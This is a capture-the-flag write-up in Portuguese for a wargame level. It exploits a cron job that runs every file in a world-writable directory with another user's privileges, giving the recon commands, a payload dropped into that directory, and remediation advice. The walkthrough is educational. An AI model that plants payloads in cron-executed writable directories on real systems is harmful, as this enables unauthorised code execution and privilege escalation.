# 𝕃𝕖𝕧𝕖𝕝 𝟘𝟝

## 🎯 Objetivo
O objetivo deste nível é explorar uma tarefa agendada do sistema (Cron Job) mal configurada, que executa cegamente arquivos colocados em um diretório público, permitindo a Execução Arbitrária de Código (Arbitrary Code Execution).

## 🔍 Análise da Vulnerabilidade

* **Tipo:** *Insecure Cron Job* (Tarefa Agendada Insegura) / *Arbitrary Code Execution*.
* **Arquivo Alvo:**
    * O script executável: `/usr/sbin/openarenaserver`
    * O diretório vulnerável: `/opt/openarenaserver/`
* **Comportamento:** Utilizando comandos de busca (`find`), localizamos um script pertencente ao usuário `flag05`. A análise desse script revelou o seguinte comportamento:
    ```bash
    #!/bin/sh
    for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done
    ```

    Este script itera sobre qualquer arquivo dentro do diretório `/opt/openarenaserver/`, executa-o via `bash` e, em seguida, o deleta. Como este script está sendo executado periodicamente em segundo plano (background) por uma tarefa agendada (Cron) com os privilégios do usuário `flag05`, e o diretório `/opt/openarenaserver/` permite escrita por qualquer usuário, podemos depositar um payload malicioso lá dentro e esperar que o sistema o execute para nós.

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento:**
    Buscamos por arquivos pertencentes ao usuário alvo (`flag05`), ocultando erros de permissão para limpar a saída:
    ```bash
    find / -user flag05 2>/dev/null
    # Saída: /usr/sbin/openarenaserver
    ```

2.  **Identificação do Arquivo:**
    ```bash
    file /usr/sbin/openarenaserver
    # Saída: POSIX shell script, ASCII text executable
    ```

3.  **Análise do Código:**
    Lemos o script para entender a sua lógica de execução e descobrimos o laço de repetição (for loop) que executa arquivos da pasta `/opt/openarenaserver/`.
    ```bash
    cat /usr/sbin/openarenaserver
    # Saída:
    # !/bin/sh
    # for i in /opt/openarenaserver/* ; do
    #         (ulimit -t 5; bash -x "$i")
    #         rm -f "$i"
    # done
    ```

4.  **Preparação e Injeção do Payload:**
    Criamos um script malicioso chamado `flag` dentro do diretório alvo. O payload contém o comando `/bin/getflag`, mas redireciona a saída (stdout) para um arquivo de texto no `/tmp`, pois não teremos acesso à tela do Cron quando ele rodar no background.
    ```bash
    echo "echo \$(/bin/getflag) > /tmp/saida_flag.txt" > /opt/openarenaserver/flag
    chmod 777 /opt/openarenaserver/flag
    ```

5.  **Execução Passiva:**
    Como o Cron Job roda em intervalos pré-definidos (ex: a cada 1 minuto), aguardamos até que o nosso arquivo `/opt/openarenaserver/flag` desapareça (deletado pelo `rm -f`). Quando isso ocorreu, lemos o arquivo de saída gerado no `/tmp`:
    ```bash
    cat /tmp/saida_flag.txt
    ```

## 🚩 Solução / Flag
O Cron Job executou o nosso payload com sucesso, salvando o token no arquivo de texto.

## 🛡️ Prevenção (Como corrigir)
1. **Permissões de Diretório Rigorosas**: Nunca configure um Cron Job privilegiado para executar arquivos de um diretório onde usuários comuns (world-writable) tenham permissão de escrita. A pasta `/opt/openarenaserver/` deveria ter permissões restritas (ex: `755` ou `700` pertencente ao root ou flag05).

2. **Validação de Arquivos**: Scripts automatizados não devem usar coringas (`*`) para executar cegamente tudo o que encontram. Devem validar extensões, donos de arquivos ou usar listas brancas (allowlists) de executáveis permitidos.
